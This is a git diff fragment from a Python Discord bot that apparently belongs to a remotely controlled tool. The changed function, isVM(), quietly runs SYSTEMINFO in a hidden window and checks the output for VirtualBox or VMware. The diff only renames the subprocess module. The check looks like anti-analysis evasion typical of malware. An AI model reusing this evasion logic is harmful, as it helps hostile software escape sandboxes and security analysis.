@@ -33,8 +33,8 @@ client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_co
 
 def isVM():
     rules = ['Virtualbox', 'vmbox', 'vmware']
-    command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
-                                stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
+    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
+                                stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                 creationflags=0x08000000)
     out, err = command.communicate()
     command.wait()
